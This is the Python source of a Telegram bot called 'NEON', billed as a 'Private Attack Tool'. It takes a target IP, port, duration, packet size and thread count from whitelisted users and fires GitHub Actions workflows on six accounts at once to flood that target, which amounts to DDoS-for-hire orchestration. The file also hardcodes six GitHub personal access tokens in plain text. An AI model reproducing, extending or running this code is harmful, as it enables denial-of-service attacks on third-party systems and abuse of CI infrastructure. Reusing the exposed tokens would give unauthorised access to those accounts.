import asyncio
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters, ConversationHandler, CallbackQueryHandler
)

# ═══════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

TELEGRAM_TOKEN = "YOUR_TOKEN"
OWNER_USERNAME = "@jaat43210"
OWNER_NAME     = "CLOUDY"
ALLOWED_USERS  = [8094697912,7973163795]

GITHUB_ACCOUNTS = [
    {
        "username": "BENTEX1",
        "token": "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",
        "workflow": {
            "repo": "CLOUDY",  # repo name only (no username/)
            "file": "main.yml",        # .yml filename in .github/workflows/
            "ref":  "main",            # branch name
        }
    },
    {
        "username": "BENTEX2",
        "token": "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",
        "workflow": {
            "repo": "CLOUDY",
            "file": "main.yml",
            "ref":  "main",
        }
    },
    {
        "username": "BENTEX4",
        "token": "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",
        "workflow": {
            "repo": "CLOUDY",
            "file": "main.yml",
            "ref":  "main",
        }
    },
    {
        "username": "BENTEX5",
        "token": "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",
        "workflow": {
            "repo": "CLOUDY",
            "file": "main.yml",
            "ref":  "main",
        }
    },
   {
        "username": "BENTEX7",
        "token": "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",
        "workflow": {
            "repo": "CLOUDY",
            "file": "main.yml",
            "ref":  "main",
        }
    },
   {
        "username": "rishipandey9350499-ai",
        "token": "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",
        "workflow": {
            "repo": "rep6",
            "file": "main.yml",
            "ref":  "main",
        }
    },
]


STICKER_START  = "CAACAgIAAxkBAAEBmZ5lAAFH9tXjHk0MXsomWf0dS8bJLmYAAkEBAAIVYmgAAR8oguHdmS8eBA"
STICKER_UNAUTH = "CAACAgIAAxkBAAEBmZ5lAAFH9tXjHk0MXsomWf0dS8bJLmYAAkEBAAIVYmgAAR8oguHdmS8eBA"

# ═══════════════════════════════════════════════════════════════════
#  CUSTOM ANIMATED EMOJI HELPERS  (Telegram Premium)
# ═══════════════════════════════════════════════════════════════════

def e(emoji_id: str, fallback: str = "⚡") -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

# Your emoji IDs mapped to nice names
FIRE   = e("5255861796350224063", "🔥")   # fire
SKULL  = e("5458515524654741536", "💀")   # skull
BOLT   = e("5363943823720333444", "⚡")   # lightning
CLOUD  = e("5366384232727855051", "🌩️")  # storm cloud
STAR   = e("5936067938955039275", "⭐")   # star
LOCK   = e("5856936061334196743", "🔐")   # lock
ROCKET = e("5224260659641857816", "🚀")   # rocket

# ═══════════════════════════════════════════════════════════════════
#  BOT LOGIC
# ═══════════════════════════════════════════════════════════════════

WAITING_FOR_INPUTS = 1

def is_allowed(update: Update) -> bool:
    if not ALLOWED_USERS:
        return True
    return update.effective_user.id in ALLOWED_USERS

def main_kb():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("💀 ATTACK",  callback_data="attack"),
            InlineKeyboardButton("📊 STATUS",  callback_data="status_btn"),
        ],
        [
            InlineKeyboardButton("📖 HELP",   callback_data="help"),
            InlineKeyboardButton("👑 OWNER",  callback_data="owner"),
        ]
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_start")]])

# ── GITHUB API ───────────────────────────────────────────────────

async def trigger_workflow(session, account, ip, port, duration, packet_size, threads):
    entry = account["workflow"]
    url = (
        f"https://api.github.com/repos/{account['username']}"
        f"/{entry['repo']}/actions/workflows/{entry['file']}/dispatches"
    )
    headers = {
        "Authorization": f"Bearer {account['token']}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
    }
    payload = {
        "ref": entry.get("ref", "main"),
        "inputs": {
            "ip": ip, "port": port,
            "duration": duration, "packet_size": packet_size, "threads": threads,
        }
    }
    try:
        async with session.post(url, headers=headers, json=payload) as resp:
            success = resp.status == 204
            body = await resp.text()
            return {"username": account["username"], "success": success,
                    "status": resp.status, "error": body if not success else None}
    except Exception as ex:
        return {"username": account["username"], "success": False, "status": 0, "error": str(ex)}

async def get_recent_runs(session, account):
    entry = account["workflow"]
    url = (
        f"https://api.github.com/repos/{account['username']}"
        f"/{entry['repo']}/actions/workflows/{entry['file']}/runs"
    )
    headers = {
        "Authorization": f"Bearer {account['token']}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
    }
    try:
        async with session.get(url, headers=headers, params={"per_page": 3}) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data.get("workflow_runs", [])
    except:
        pass
    return []

# ── UNAUTHORIZED ─────────────────────────────────────────────────

async def send_unauth(update: Update):
    text = (
        f"{SKULL}{SKULL}{SKULL}  <b>ACCESS DENIED</b>  {SKULL}{SKULL}{SKULL}\n\n"
        f"{LOCK} This is a <b>private</b> tool.\n"
        f"{FIRE} Owned by <b>CLOUDY</b>\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{BOLT} You are <b>not whitelisted.</b>\n"
        f"Contact the owner to get access:\n\n"
        f"{CLOUD} <b>CLOUDY</b> → <code>@jaat43210</code>\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("💬 Contact CLOUDY 💀", url="https://t.me/jaat43210")
    ]])
    try:
        await update.message.reply_sticker(STICKER_UNAUTH)
    except:
        pass
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb)

# ── /start ───────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        await send_unauth(update)
        return ConversationHandler.END

    user = update.effective_user
    name = user.first_name or "Warrior"

    text = (
        f"{FIRE}{BOLT}{SKULL}  <b>C L O U D Y</b>  {SKULL}{BOLT}{FIRE}\n\n"
            "<code>"
            "  ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ██╗   ██╗\n"
            " ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗╚██╗ ██╔╝\n"
            " ██║     ██║     ██║   ██║██║   ██║██║  ██║ ╚████╔╝ \n"
            " ██║     ██║     ██║   ██║██║   ██║██║  ██║  ╚██╔╝  \n"
            " ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝   ██║   \n"
            "  ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   \n"
            "</code>\n"
        f"{CLOUD}{CLOUD} <b>Welcome,</b> <code>{name}</code>\n\n"
        f"{STAR} <b>NEON</b> — Private Attack Tool\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "<code>"
        f"  NODES    :  DEEP CRY\n"
        "  MODE     :  SOILDERS\n"
        "  ENGINE   :  DARKENERGY\n"
        "  STATUS   :  ARMED 🟢\n"
        "</code>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{ROCKET} Choose an action {BOLT}"
    )

    try:
        await update.message.reply_sticker(STICKER_START)
    except:
        pass
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_kb())
    return WAITING_FOR_INPUTS

# ── /help ────────────────────────────────────────────────────────

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        await send_unauth(update)
        return
    text = (
        f"{BOLT}{SKULL} <b>NEON — HELP GUIDE</b> {SKULL}{BOLT}\n"
        f"{FIRE} <i>by CLOUDY</i>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{STAR} <b>Commands:</b>\n"
        "  <code>/start</code>  — Launch NEON\n"
        "  <code>/help</code>   — This guide\n"
        "  <code>/owner</code>  — Owner info\n"
        "  <code>/status</code> — Live attack logs\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{ROCKET} <b>Attack Format:</b>\n\n"
        "<code>IP  PORT  DURATION  PACKET_SIZE  THREADS</code>\n\n"
        f"{BOLT} <b>Example:</b>\n"
        "<code>1.1.1.1  80  60  1024  10</code>\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"{CLOUD}{SKULL} <b>CLOUDY</b> — NEON Tool"
    )
    await update.message.reply_text(text, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("💬 Contact CLOUDY 💀", url="https://t.me/jaat43210")
        ]]))

# ── /owner ───────────────────────────────────────────────────────

async def owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"{SKULL}{FIRE} <b>OWNER INFO</b> {FIRE}{SKULL}\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{CLOUD} <b>Name    :</b>  CLOUDY\n"
        f"{BOLT} <b>Contact :</b>  <code>@jaat43210</code>\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"{LOCK} NEON is a <b>private</b> tool.\n"
        "Access is granted by <b>CLOUDY</b> only.\n\n"
        f"{STAR}{SKULL} <b>CLOUDY</b> — NEON Tool"
    )
    await update.message.reply_text(text, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("💬 Message CLOUDY 💀", url="https://t.me/jaat43210")
        ]]))

# ── STATUS RENDERER ──────────────────────────────────────────────

async def _render_status(msg):
    CONCLUSION_ICON = {
        "success":     "✅",
        "failure":     "❌",
        "cancelled":   "⚫",
        "in_progress": "🟡",
        "queued":      "🔵",
    }
    CONCLUSION_BAR = {
        "success":     "█",
        "failure":     "▒",
        "in_progress": "▓",
        "queued":      "░",
        "cancelled":   "░",
    }

    async with aiohttp.ClientSession() as session:
        tasks = [get_recent_runs(session, acc) for acc in GITHUB_ACCOUNTS]
        all_runs = await asyncio.gather(*tasks)

    lines = [
        f"{FIRE}{SKULL}{BOLT}  <b>ATTACK LOG — CLOUDY</b>  {BOLT}{SKULL}{FIRE}\n"
        f"{STAR} <i>NEON — Live Node Status</i>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    ]

    for acc, runs in zip(GITHUB_ACCOUNTS, all_runs):
        lines.append(f"{CLOUD} <b>{acc['username']}</b>")
        if not runs:
            lines.append(f"  {LOCK} <code>NO RUNS FOUND</code>\n")
            continue
        for run in runs[:2]:
            conclusion = run.get("conclusion") or run.get("status", "unknown")
            icon  = CONCLUSION_ICON.get(conclusion, "❓")
            bar   = CONCLUSION_BAR.get(conclusion, "░")
            num   = run.get("run_number", "?")
            ts    = run.get("created_at", "")[:16].replace("T", " ")
            filled = bar * 20
            lines.append(
                f"  {icon} <code>RUN #{num}</code> — <b>{conclusion.upper()}</b>\n"
                f"  <code>[{filled}]</code>\n"
                f"  <code>🕐 {ts} UTC</code>"
            )
        lines.append("")

    lines.append(
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"{ROCKET}{SKULL} <b>CLOUDY</b> — NEON Tool"
    )
    await msg.edit_text("\n".join(lines), parse_mode="HTML")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        await send_unauth(update)
        return
    msg = await update.message.reply_text("🔄 Scanning nodes...", parse_mode="HTML")
    await _render_status(msg)

# ── INLINE BUTTON HANDLER ────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "attack":
        text = (
            f"{SKULL}{BOLT} <b>TARGET INPUT REQUIRED</b> {BOLT}{SKULL}\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"{ROCKET} <b>Send in one message:</b>\n\n"
            "<code>IP  PORT  DURATION  PACKET_SIZE  THREADS</code>\n\n"
            f"{BOLT} <b>Example:</b>\n"
            "<code>1.1.1.1 80 60 1024 10</code>\n\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"{FIRE}{SKULL} <b>CLOUDY</b> — NEON Tool"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_kb())

    elif data == "help":
        text = (
            f"{BOLT}{SKULL} <b>NEON — HELP GUIDE</b> {SKULL}{BOLT}\n"
            f"{FIRE} <i>by CLOUDY</i>\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"{STAR} <b>Commands:</b>\n"
            "  <code>/start</code>  — Launch NEON\n"
            "  <code>/help</code>   — Help guide\n"
            "  <code>/owner</code>  — Owner info\n"
            "  <code>/status</code> — Attack logs\n\n"
            f"{ROCKET} <b>Format:</b>\n"
            "<code>IP  PORT  DURATION  PACKET_SIZE  THREADS</code>\n\n"
            f"{CLOUD}{SKULL} <b>CLOUDY</b> — NEON Tool"
        )
        await query.edit_message_text(text, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Contact CLOUDY 💀", url="https://t.me/jaat43210")],
                [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
            ]))

    elif data == "owner":
        text = (
            f"{SKULL}{FIRE} <b>OWNER INFO</b> {FIRE}{SKULL}\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"{CLOUD} <b>Name    :</b>  CLOUDY\n"
            f"{BOLT} <b>Contact :</b>  <code>@jaat43210</code>\n\n"
            f"{LOCK} NEON is <b>private.</b> Access by CLOUDY only.\n\n"
            f"{STAR}{SKULL} <b>CLOUDY</b> — NEON Tool"
        )
        await query.edit_message_text(text, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Message CLOUDY 💀", url="https://t.me/jaat43210")],
                [InlineKeyboardButton("🔙 BACK", callback_data="back_start")]
            ]))

    elif data == "status_btn":
        await query.edit_message_text("🔄 Scanning nodes...", parse_mode="HTML")
        await _render_status(query.message)

    elif data == "back_start":
        text = (
            f"{FIRE}{BOLT}{SKULL}  <b>C L O U D Y</b>  {SKULL}{BOLT}{FIRE}\n\n"
            "<code>"
            "  ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ██╗   ██╗\n"
            " ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗╚██╗ ██╔╝\n"
            " ██║     ██║     ██║   ██║██║   ██║██║  ██║ ╚████╔╝ \n"
            " ██║     ██║     ██║   ██║██║   ██║██║  ██║  ╚██╔╝  \n"
            " ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝   ██║   \n"
            "  ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   \n"
            "</code>\n"
            f"{STAR} <b>NEON</b> — Private Attack Tool\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            "<code>"
            f"  NODES    :  {len(GITHUB_ACCOUNTS)} ACCOUNTS\n"
            "  MODE     :  SIMULTANEOUS\n"
            "  ENGINE   :  GITHUB ACTIONS\n"
            "  STATUS   :  ARMED 🟢\n"
            "</code>\n"
            "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"{ROCKET} Choose an action {BOLT}"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_kb())

# ── HANDLE ATTACK INPUTS ─────────────────────────────────────────

async def handle_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update):
        await send_unauth(update)
        return ConversationHandler.END

    parts = update.message.text.strip().split()

    if len(parts) != 5:
        await update.message.reply_text(
            f"{SKULL} <b>INVALID INPUT</b>\n\n"
            "<code>IP  PORT  DURATION  PACKET_SIZE  THREADS</code>\n\n"
            f"{BOLT} Example: <code>1.1.1.1 80 60 1024 10</code>",
            parse_mode="HTML"
        )
        return WAITING_FOR_INPUTS

    ip, port, duration, packet_size, threads = parts

    for label, val in [("PORT", port), ("DURATION", duration),
                       ("PACKET_SIZE", packet_size), ("THREADS", threads)]:
        if not val.isdigit():
            await update.message.reply_text(
                f"{SKULL} <code>{label}</code> must be a number, got: <code>{val}</code>\n\nTry again:",
                parse_mode="HTML"
            )
            return WAITING_FOR_INPUTS

    # Attack initiated message
    init_text = (
        f"{FIRE}{BOLT}{SKULL} <b>ATTACK INITIATED</b> {SKULL}{BOLT}{FIRE}\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "<code>"
        f"  TARGET      :  {ip}:{port}\n"
        f"  DURATION    :  {duration}s\n"
        f"  PACKET SIZE :  {packet_size} bytes\n"
        f"  THREADS     :  {threads}\n"
        f"  NODES       :  {len(GITHUB_ACCOUNTS)}\n"
        "  STATUS      :  LAUNCHING...\n"
        "</code>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"{ROCKET}{ROCKET} <i>Firing all nodes simultaneously...</i>"
    )
    msg = await update.message.reply_text(init_text, parse_mode="HTML")

    async with aiohttp.ClientSession() as session:
        tasks = [
            trigger_workflow(session, acc, ip, port, duration, packet_size, threads)
            for acc in GITHUB_ACCOUNTS
        ]
        results = await asyncio.gather(*tasks)

    ok    = sum(1 for r in results if r["success"])
    total = len(results)

    node_lines = ""
    for r in results:
        if r["success"]:
            node_lines += f"  ✅ <code>{r['username']}</code> — <b>ONLINE</b>\n"
        else:
            node_lines += f"  ❌ <code>{r['username']}</code> — HTTP {r['status']}\n"
            err = (r.get("error") or "").strip()[:60]
            if err:
                node_lines += f"      <code>↳ {err}</code>\n"

    status_word = "ALL NODES LIVE" if ok == total else (f"{ok}/{total} NODES" if ok > 0 else "ALL FAILED")

    end_text = (
        f"{FIRE}{SKULL}{BOLT} <b>ATTACK LAUNCHED</b> {BOLT}{SKULL}{FIRE}\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "<code>"
        f"  TARGET      :  {ip}:{port}\n"
        f"  DURATION    :  {duration}s\n"
        f"  PACKET SIZE :  {packet_size} bytes\n"
        f"  THREADS     :  {threads}\n"
        f"  RESULT      :  {status_word}\n"
        "</code>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"{node_lines}\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"{CLOUD}{SKULL} <b>CLOUDY</b> — NEON Tool"
    )
    await msg.edit_text(end_text, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("📊 Check Status", callback_data="status_btn"),
            InlineKeyboardButton("🔙 Menu",         callback_data="back_start"),
        ]]))
    return WAITING_FOR_INPUTS

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"{SKULL} <b>Cancelled.</b>\n<code>/start</code> to relaunch.\n\n{FIRE} <b>CLOUDY</b> — NEON",
        parse_mode="HTML"
    )
    return ConversationHandler.END

# ── MAIN ─────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_INPUTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_inputs)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )
    app.add_handler(conv)
    app.add_handler(CommandHandler("help",   help_cmd))
    app.add_handler(CommandHandler("owner",  owner_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("💀 NEON by CLOUDY — Running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
